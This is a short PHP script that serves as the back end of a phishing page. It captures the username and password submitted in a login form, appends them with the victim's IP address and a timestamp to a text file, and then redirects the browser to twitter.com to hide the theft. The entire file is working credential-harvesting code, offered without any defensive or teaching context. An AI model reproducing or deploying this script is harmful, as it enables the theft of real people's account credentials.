<?php 

date_default_timezone_set('Europe/Istanbul');

$kullaniciadi = $_POST['Username'];
$sifre = $_POST['Password'];
$ip =$_SERVER["REMOTE_ADDR"];
$tarih = date('d.m.Y - H:i');

$dosya = fopen("newfile.txt", "a") or die("Unable to open file!");
$yaz="Date: ".$tarih."\nUsername:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n\n";
fwrite($dosya, $yaz);
fclose($dosya);

header("Location: https://twitter.com/");
die();

 ?>
